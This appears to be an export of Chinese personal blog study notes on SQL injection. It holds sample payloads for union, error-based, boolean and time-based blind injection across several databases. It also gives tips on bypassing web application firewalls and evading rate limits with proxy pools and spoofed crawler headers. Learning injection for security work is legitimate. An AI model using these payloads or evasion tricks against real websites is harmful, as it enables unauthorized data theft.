    <content><![CDATA[<h2 id="SQL注入学习笔记（四）–除MYSQL数据库-如mongoDB-oracle等-的注入"><a href="#SQL注入学习笔记（四）–除MYSQL数据库-如mongoDB-oracle等-的注入" class="headerlink" title="SQL注入学习笔记（四）–除MYSQL数据库(如mongoDB,oracle等)的注入"></a>SQL注入学习笔记（四）–除MYSQL数据库(如mongoDB,oracle等)的注入</h2><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">除了<span class="keyword">Access</span>外,其他数据库类型结构均与MYSQL结构相差不大,只是相关注入语句不同。</span><br><span class="line">可以用一些工具判断数据库的类型,如SQLmap，kali等。</span><br></pre></td></tr></table></figure>
<h3 id="ACCESS注入"><a href="#ACCESS注入" class="headerlink" title="ACCESS注入"></a>ACCESS注入</h3><p>1、Access数据库结构(单库,不存在跨库)<br>表名<br>列名<br>数据<br>2、access 数据库都是存放在网站目录下，后缀格式为 mdb，asp，asa,可以通过一些暴库手段、目录猜解等直接下载数据库<br>Access扁移注入:<br>解决列名获取不到的情况<br>查看登陆框源代码的表单值或观察URL特征等也可以针对表或列获取不到的情况</p>
<h4 id="access三大攻击手法"><a href="#access三大攻击手法" class="headerlink" title="access三大攻击手法"></a>access三大攻击手法</h4><p>1.access注入攻击片段-联合查询法<br>2.access注入攻击片段-逐字猜解法<br>3.工具类的使用注入（推荐）</p>
<h4 id="Access注入攻击方式"><a href="#Access注入攻击方式" class="headerlink" title="Access注入攻击方式"></a>Access注入攻击方式</h4><p>union 注入、http header 注入、偏移注入等<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=14&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Access数据库注入演示:31:00</a></p>
<h3 id="mssql注入"><a href="#mssql注入" class="headerlink" title="mssql注入"></a>mssql注入</h3><p>mssql特有的系统表：sysobjects<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=14&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">mssal(SQLserver)数据库注入演示:41:00</a></p>
<h3 id="postgresql注入"><a href="#postgresql注入" class="headerlink" title="postgresql注入"></a>postgresql注入</h3><p><a href="https://www.yuque.com/weiker/xiaodi/us54cb">各种注入工具(如sqlmap)的使用</a></p>
<h3 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=14&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Oracle数据库注入演示:1:23:00</a></p>
<h3 id="mongoDB注入"><a href="#mongoDB注入" class="headerlink" title="mongoDB注入"></a>mongoDB注入</h3><p>1、mongoDB是非关系型数据库。<br>2、与其他数据库查询语法不同,要上网查资料。<br>3、且SQLmap识别不了(SQLmap支持关系型数据库),得换其他工具(如nosqlattack)。<br><a href="https://github.com/youngyangyang04/NoSQLAttack">nosqlattack下载:</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=14&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">mongoDB数据库注入演示:1:29:00</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入--类型以及提交注入</title>
    <url>/2023/09/22/SQLinjectThird/</url>
    <content><![CDATA[<h2 id="SQL注入学习笔记（三）–类型以及提交注入"><a href="#SQL注入学习笔记（三）–类型以及提交注入" class="headerlink" title="SQL注入学习笔记（三）–类型以及提交注入"></a>SQL注入学习笔记（三）–类型以及提交注入</h2><h3 id="参数类型以及请求方法"><a href="#参数类型以及请求方法" class="headerlink" title="参数类型以及请求方法"></a>参数类型以及请求方法</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">#简要明确参数类型</span><br><span class="line">数字，字符，搜索，<span class="type">JsoN</span>等</span><br><span class="line">#简要明确请求(提交)方法</span><br><span class="line"><span class="number">1</span>、<span class="keyword">GET</span>, POST,COOKIE(不是请求方法，仅仅是数据包内的东西)，REQUEST，HTTP头部注入(<span class="keyword">User</span>-Agent注入、Referer注入)等<span class="comment">--这几种都存在注入。</span></span><br><span class="line">大数据、重要数据、表单用post提交;小数据用<span class="keyword">get</span>提交;request全部(<span class="keyword">GET</span>,POST)接收。</span><br><span class="line"><span class="number">2</span>、其中<span class="keyword">sql</span>语句干扰符号: <span class="string">&#x27;,&quot;,s,),&#125;等，具体需看写法,自己尝试。</span></span><br><span class="line"><span class="string">3、对方采取什么方式提交数据，那么你就应该采取那种方式注入。</span></span><br><span class="line"><span class="string">4、$_SERVER(&#x27;</span>HTTP_USER_AGENT<span class="string">&#x27;),获取对方网站硬件配置(如操作系统)信息--拓展原有注入思路，在原有数据包进行注入(HTTP头部注入)。</span></span><br></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=13&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">请求方法讲解以及此类注入演示:17:00处</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=13&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">猜某网站是何种请求方法:35:00处</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=13&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">各种注入方法以及靶场位置(供自己练习–burp+watefox):44:00</a></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">学习中遇到的问题:</span><br><span class="line">1、有时候在?<span class="attribute">id</span>=1后面输入and <span class="attribute">1</span>=1或and <span class="attribute">1</span>=2返回的页面无任何区别。</span><br><span class="line">答：这是由于1可能是字符，你可以在<span class="keyword">and</span>前加一个单引号，把这一块闭合：<span class="string">&#x27; and 1=1--+(有时候这个注释符要换成#)。</span></span><br><span class="line"><span class="string">    get用--+，post用#。</span></span><br><span class="line"><span class="string">    也可以不注释，&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1。</span></span><br><span class="line"><span class="string">2、若无回显，那么就是盲注。</span></span><br><span class="line"><span class="string">3、有时候不一定要闭合&#x27;</span>，还有可能,<span class="string">&quot;,s,),&#125;等，具体需看写法,自己尝试。</span></span><br><span class="line"><span class="string">4、post类型的注入通常产生在登陆界面，先考虑两个问题:提交方式以及参数类型。</span></span><br><span class="line"><span class="string">5、当使用post提交数据时，若搞来搞去没任何反应，这时候就应该是对post过滤了，可以尝试get或cookie注入。</span></span><br><span class="line"><span class="string">6、json的文件格式(APP常见)：</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">   &quot;</span>user<span class="string">&quot;:&quot;</span>xiaodi <span class="string">&#x27;and 1=1&quot;//闭不闭合,是看SQL语句的,若SQL语句默认用&#x27;</span><span class="string">&#x27;接受这个JSON文件(例如数据是字符),那么要闭合。</span></span><br><span class="line"><span class="string">   &quot;password&quot;:&quot;xiaodi&quot;//SQL的闭合是要闭合后端代码，这个双引号是前端json的格式。</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">注入的时候要注意注入的格式(其实就是格式不同而已)，保证注入语句成功带入数据库执行。</span></span><br></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=13&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">cookie注入演示:1:20:00处</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=13&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Json文件相关介绍以及此类型的注入:1:41:00处</a></p>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="symbol">eg:</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> name=xiaodi</span><br><span class="line">注入语句是:在xiaodi后加上 <span class="comment">&#x27; and 1=1 --+(# 只针对MYSQL)</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入--查询方式、报错盲注、二次、加解密以及DNSlog等注入</title>
    <url>/2023/09/24/SQLinjectionFifth/</url>
    <content><![CDATA[<h2 id="SQL注入学习笔记（五）–查询方式、报错盲注、二次、加解密以及DNSlog等注入"><a href="#SQL注入学习笔记（五）–查询方式、报错盲注、二次、加解密以及DNSlog等注入" class="headerlink" title="SQL注入学习笔记（五）–查询方式、报错盲注、二次、加解密以及DNSlog等注入"></a>SQL注入学习笔记（五）–查询方式、报错盲注、二次、加解密以及DNSlog等注入</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">拿到一个网站,先判断其最可能是何种查询方式,再判断其有无回显,最后选择注入方式。</span><br></pre></td></tr></table></figure>
<p>当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式(如增删改)的问题<br>导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大<br>概写法也能更好的选择对应的注入语句。(有时候select语句的执行结果也无回显,仅仅是对select的结果进行判断<br>,然后返回的东西不涉及真实数据。)</p>
<h3 id="SQL语句盲注"><a href="#SQL语句盲注" class="headerlink" title="SQL语句盲注"></a>SQL语句盲注</h3><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，<br>这个过程称之为盲注。我们可以知道盲注分为以下三类:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、基于布尔的<span class="keyword">sQL</span>盲注<span class="operator">-</span>逻辑判断 regexp, <span class="keyword">like</span> , ascii,<span class="keyword">left</span>, ord , mid</span><br><span class="line"><span class="number">2</span>、基于时间的<span class="keyword">sQL</span>盲注<span class="operator">-</span>延时判断 if ,sleep</span><br><span class="line"><span class="number">3</span>、基于报错的<span class="keyword">sQL</span>盲注<span class="operator">-</span>报错回显(强制回显) floor, updatexml, extractvalue </span><br><span class="line"><span class="comment">--先强制报错,不行再逻辑判断,最后延时判断。</span></span><br></pre></td></tr></table></figure>
<p><a href="https://www.jianshu.com/p/bc35f8dd4f7c">报错回显常见函数解析以及相关使用方法</a></p>
<h3 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h3><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span>xiaodi&#x27;<span class="keyword">or</span> updatexml(<span class="number">1</span><span class="punctuation">,</span>concat(<span class="number">0x7e</span><span class="punctuation">,</span>version()<span class="punctuation">,</span><span class="number">0x7e</span>)<span class="punctuation">,</span><span class="number">0</span>) <span class="keyword">or</span>&#x27;&amp;password<span class="operator">=</span><span class="number">123456</span>&amp;sex<span class="operator">=</span>man&amp;phonenum<span class="operator">=</span><span class="number">138</span>&amp;email<span class="operator">=</span><span class="variable">%E5</span><span class="variable">%9</span>B<span class="variable">%9</span>B<span class="variable">%E5</span><span class="variable">%B7</span><span class="variable">%9</span>D&amp;<span class="keyword">add</span><span class="operator">=</span><span class="variable">%E6</span><span class="variable">%88</span><span class="variable">%90</span><span class="variable">%E9</span><span class="variable">%83</span><span class="variable">%BD</span>&amp;submit<span class="operator">=</span>submit</span><br></pre></td></tr></table></figure>
<p>注意：将注入语句放在语句的其他位置(如email等)是可以的,注意看网站提交的数据。</p>
<h3 id="时间盲注-if-sleep"><a href="#时间盲注-if-sleep" class="headerlink" title="时间盲注(if+sleep)"></a>时间盲注(if+sleep)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * from member <span class="built_in">where</span> <span class="built_in">id</span>=1 and <span class="built_in">sleep</span>(<span class="keyword">if</span>(database()=<span class="string">&#x27;pikachu&#x27;</span>,5,0));</span><br><span class="line">Empty <span class="built_in">set</span> (5.00 sec)</span><br><span class="line">语句的意思就是如果数据是pikachu就延迟5秒输出，不是的话就立即返回，但是在实际渗透过程中由于受到网络的影响时间注入不是很靠谱。</span><br><span class="line"><span class="built_in">limit</span> 0,1 <span class="comment">#表示从第一行开始取一行</span></span><br></pre></td></tr></table></figure>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">布尔（<span class="type">Boolean</span>）型是计算机里的一种数据类型，只有<span class="literal">True</span>（真）和<span class="literal">False</span>（假）两个值。一般也称为逻辑型。</span><br><span class="line"> 页面在执行<span class="keyword">sql</span>语句后，只显示两种结果，这时可通过构造逻辑表达式的<span class="keyword">sql</span>语句来判断数据的具体内容。</span><br></pre></td></tr></table></figure>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">注意:盲注时,先判断数据库名字长度,再一位一位截取。</span></span><br></pre></td></tr></table></figure>
<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>加解密注入:先要把语句写好，再做同种加密。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=16&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">加解密注入演示:3:00</a><br>二次注入:一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。(一般这种漏洞存在于代码审计)<br>比如搜索框、输入框、注册框、更改密码框里面写入语句，然后页面将数据带到数据库进行拼接，形成sql二次注入。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=16&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">二次注入演示:28:00</a><br>DNSlog注入:使用DnsLog盲注仅限于windos环境。,且拥有高权限(如文件读取)。<br>DNSlog:解决了盲注不能回显数据、效率低的问题。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=16&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">DNSlog注入演示:48:00</a><br>中转注入:自己写脚本放入sqlmap内的tamper(插件库)内,然后使用sqlmap注入时调用,碰到没有插件可以用中转注入。<br>(自己手写代码,利用sqlmap注入,以后可以自己开发些网上没有的插件,辅助自己注入)<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=16&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">中转注入演示:1:00:00</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入--SQL堆叠注入以及WAF绕过注入</title>
    <url>/2023/09/26/SQLinjectionSixth/</url>
    <content><![CDATA[<h2 id="SQL注入学习笔记（六）–SQL堆叠注入以及WAF绕过注入"><a href="#SQL注入学习笔记（六）–SQL堆叠注入以及WAF绕过注入" class="headerlink" title="SQL注入学习笔记（六）–SQL堆叠注入以及WAF绕过注入"></a>SQL注入学习笔记（六）–SQL堆叠注入以及WAF绕过注入</h2><h3 id="stacked-injections-堆叠注入"><a href="#stacked-injections-堆叠注入" class="headerlink" title="stacked injections(堆叠注入)"></a>stacked injections(堆叠注入)</h3><p>定义:<br>  从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。<br>  而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加;<br>表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。<br>  局限性:只产生于部分数据库。<br>  备注：堆叠注入的可以运用于创建用户。由于我们使用网站用户进行注入不能查看到数据库的密码,<br>但是我们可以创建用户来登录迂回的注入数据库，这样可以通过插入数据实现正常登录。<br>前提是网站的管理员必须是高权限。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=17&vd_source=d32bce54780cf3d9710df43274886fde">堆叠注入演示:4:00</a></p>
<h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><p>主要研究三种WAF:阿里云盾、安全狗(易)、宝塔(难)。<br>1、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=17&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">绕过安全狗演示(更改传参方式:35:00</a></p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">一些<span class="built_in">injection</span> payload</span><br></pre></td></tr></table></figure>
<p>2、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=17&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">绕过思路之一些数据绕过的知识干货(内联注释&#x2F;**&#x2F;的妙用):45:00</a><br>3、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=17&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">绕过思路之注释符(%27)以及换行符(%0A)绕过的妙用:1:05:00</a><br>4、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=17&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">绕过思路之特殊符号、内联注释以及http参数污染注入的妙用:1:11:00</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">其他方法</span><br></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=17&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Fuzz大法(模糊测试)–类似于爆破的一种思路(只不过自己写脚本让程序帮你):1:30:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=18&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">其他绕过WAF方法(可二刷)：0:00~20:00</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">个人感觉伪造爬虫白名单较为妙,可以自己尝试。</span><br></pre></td></tr></table></figure>

<h3 id="SQLmap绕过WAF"><a href="#SQLmap绕过WAF" class="headerlink" title="SQLmap绕过WAF"></a>SQLmap绕过WAF</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=18&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">迪总在线教如何写脚本：40：00</a><br>1、有时候SQLmap注入失败可能是http头部(user-agent)包含注入工具的信息,被WAF识别到,故拦截。所以碰<br>到注入失败,要想到这个问题,要学会使用burp suite配合sqlmap进行注入。(还有就是注入一次后,记得删除<br>sqlmap的缓存)。<br>2、可以结合中转注入的思路。</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">若目标网站存在流量控制:</span><br><span class="line"><span class="number">1</span>、代理池</span><br><span class="line"><span class="number">2</span>、设置延时函数</span><br><span class="line"><span class="number">3</span>、设置可能的存在于白名单的爬虫<span class="comment">(百度、搜狐等这些可能在爬虫白名单)</span></span><br></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=18&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">很有意义,二刷</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">所以说不要当脚本小子！！！</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>初步理解SQL注入(二)</title>
    <url>/2023/09/16/SQLzhuru/</url>
    <content><![CDATA[<h2 id="初步理解SQL注入-二"><a href="#初步理解SQL注入-二" class="headerlink" title="初步理解SQL注入(二)"></a>初步理解SQL注入(二)</h2><h3 id="单引号”-‘-“的作用"><a href="#单引号”-‘-“的作用" class="headerlink" title="单引号” ‘ “的作用"></a>单引号” ‘ “的作用</h3><p>   主要是为了匹配SQL语句中的id&#x3D;&#x3D;’ ** ‘，如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> xx <span class="keyword">from</span> xx <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27; 1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+(或 #) &#x27; //返回此数据库中全部if中含1的数据</span></span><br><span class="line"><span class="keyword">select</span> xx <span class="keyword">from</span> xx <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27; 1&#x27;</span> (<span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>) <span class="comment">--+(或#) &#x27; //仅返回1条，--+(或 #)是注释的意思。</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>如果不注释，页面虽然也会报错，但是仅仅是<span class="keyword">SQL</span>语句执行错误的报错。而不是发现有<span class="keyword">SQL</span>注入的错误提示。</span><br></pre></td></tr></table></figure>

<h3 id="and判断与or判断的区别"><a href="#and判断与or判断的区别" class="headerlink" title="and判断与or判断的区别"></a>and判断与or判断的区别</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>.and判断</span><br><span class="line">  <span class="attribute">http</span>://www.xxx.com/xxx.asp?id=<span class="number">1</span>’and <span class="number">1</span>=<span class="number">1</span>这个条件是永真的，所以返回是正常页</span><br><span class="line">  <span class="attribute">http</span>://www.xxx.com/xxx.asp?id=<span class="number">1</span>’and <span class="number">1</span>=<span class="number">2</span>如果报错那说明存在注入漏洞。</span><br><span class="line"></span><br><span class="line"><span class="attribute">2</span>.or判断</span><br><span class="line">  <span class="attribute">or</span>跟and判断方法不一样的，and是提交返回错误才有注入点，而or是提交返回正确有注入点</span><br><span class="line">  <span class="attribute">http</span>://www.xxx.com/xxx.asp?id=<span class="number">1</span>’or <span class="number">1</span>=<span class="number">1</span></span><br><span class="line">  <span class="attribute">http</span>://www.xxx.com/xxx.asp?id=<span class="number">1</span>’or <span class="number">1</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure>

<h3 id="“-“-”可以是任意一个符号-“与”-”都表示注释符"><a href="#“-“-”可以是任意一个符号-“与”-”都表示注释符" class="headerlink" title="“- -+(“+”可以是任意一个符号)“与”#”都表示注释符"></a>“- -+(“+”可以是任意一个符号)“与”#”都表示注释符</h3><h3 id="初始order-函数"><a href="#初始order-函数" class="headerlink" title="初始order()函数"></a>初始order()函数</h3><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">` <span class="keyword">order</span> <span class="title">by</span> num <span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>   主要作用是通过修改此函数中的num,不断进行提交，如果num与此数据库的列数不匹配，则会报错。<br>   如：’ order by 3 #</p>
<h3 id="初始union-函数"><a href="#初始union-函数" class="headerlink" title="初始union()函数"></a>初始union()函数</h3><p>   SQL语句中的联合查询，在SQL注入中有如下作用： </p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、获取数据库的名字以及版本</span><br><span class="line"><span class="string">&#x27; union select database(),version() #</span></span><br><span class="line"><span class="string">2、暂时不知道有什么用</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> #</span><br><span class="line">（写全的话是<span class="keyword">select</span> aa,bb <span class="keyword">from</span> xx <span class="keyword">where</span> id=<span class="string">&#x27; &#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span> xx # <span class="string">&#x27;）</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>简单了解SQL注入原理，判断注入点</title>
    <url>/2023/09/20/SQLzhuruER/</url>
    <content><![CDATA[<h2 id="SQL注入学习笔记-一-–简单了解SQL注入原理，判断注入点"><a href="#SQL注入学习笔记-一-–简单了解SQL注入原理，判断注入点" class="headerlink" title="SQL注入学习笔记(一)–简单了解SQL注入原理，判断注入点"></a>SQL注入学习笔记(一)–简单了解SQL注入原理，判断注入点</h2><h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span>注入是一种将<span class="keyword">SQL</span>代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的<span class="keyword">sql</span>服务器加以</span><br><span class="line">解析和执行。由于<span class="keyword">sql</span>语句本身的多样性，以及可用于构造<span class="keyword">sql</span>语句的编程方法很多，因此凡是构造<span class="keyword">sql</span>语句的步骤均存在被</span><br><span class="line">攻击的潜在风险。<span class="keyword">Sql</span>注入的方式主要是直接将代码插入参数中，这些参数会被置入<span class="keyword">sql</span>命令中加以执行。间接的攻击方式是</span><br><span class="line">将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态<span class="keyword">sql</span>命</span><br><span class="line">令中时，恶意代码就将被执行。</span><br></pre></td></tr></table></figure>
<h3 id="SQL注入产生过程"><a href="#SQL注入产生过程" class="headerlink" title="SQL注入产生过程"></a>SQL注入产生过程</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编</span><br><span class="line">程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给</span><br><span class="line"><span class="keyword">sql</span>查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现<span class="keyword">sql</span>注入漏洞，如果攻击者能够控制发</span><br><span class="line">送给<span class="keyword">sql</span>查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</span><br></pre></td></tr></table></figure>
<h3 id="一个网站在执行SQL语句时大概流程"><a href="#一个网站在执行SQL语句时大概流程" class="headerlink" title="一个网站在执行SQL语句时大概流程"></a>一个网站在执行SQL语句时大概流程</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、接收数据</span><br><span class="line"><span class="number">2</span>、拼接数据</span><br><span class="line"><span class="number">3</span>、执行<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="number">4</span>、展示执行结果</span><br></pre></td></tr></table></figure>
<h3 id="判断是否存在注入点（SQL语句是否可以进行拼接）"><a href="#判断是否存在注入点（SQL语句是否可以进行拼接）" class="headerlink" title="判断是否存在注入点（SQL语句是否可以进行拼接）"></a>判断是否存在注入点（SQL语句是否可以进行拼接）</h3><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、逻辑值（老方法）</span><br><span class="line">    <span class="keyword">and</span> <span class="number">1</span> = <span class="number">1</span>		页面正常（和以前页面无太大区别）</span><br><span class="line">    <span class="keyword">and</span> <span class="number">1</span> = <span class="number">2</span>		页面异常</span><br><span class="line">    则可能存在注入点</span><br><span class="line"><span class="number">2</span>、乱输一顿（返回正常页面说明过滤了；返回错误页面说明查询了，有带入数据库查询，即说明存在注入点）</span><br><span class="line">    www.xiaodi8.com/news.php?y=<span class="number">1</span>asdawdasdwa</span><br><span class="line"><span class="number">3</span>、<span class="keyword">order</span> <span class="title">by</span></span><br><span class="line">	通过<span class="keyword">order</span> <span class="title">by</span> 判断注入的字段数</span><br><span class="line"><span class="number">4</span>、若输入东西进去，跳转到<span class="number">404</span>错误或者跳转到主页，说明网站存在过滤</span><br><span class="line"> ```   </span><br><span class="line"><span class="comment">### 可注入条件,产生条件</span></span><br></pre></td></tr></table></figure>
<p>可控变量，带入数据库查询($result&#x3D;mysql_query($sql);)，变量未存在过滤或过滤不严谨。<br>eg:<br>$id&#x3D;$_GET[‘id’];<br>$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1”;<br>&#x2F;&#x2F;直接传递的变量$id带入sql语句中执行没有做任何的限制，这样为恶意代码插入执行创造了条件。通过修改带入的代码执行<br>&#x2F;&#x2F;的语句最终达到SQL注入获取敏感信息<br>防范：在接收参数后，进行过滤，再带入数据库进行查询。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[简单SQL注入演示:<span class="number">13</span>:<span class="number">00</span>](https:<span class="regexp">//</span>www.bilibili.com<span class="regexp">/video/</span>BV1JZ4y1c7ro/?p=<span class="number">11</span>&amp;spm_id_from=pageDriver&amp;vd_source=d32bce54780cf3d9710df43274886fde)</span><br><span class="line"><span class="comment">### 判断一下网址哪可能存在注入点</span></span><br></pre></td></tr></table></figure>
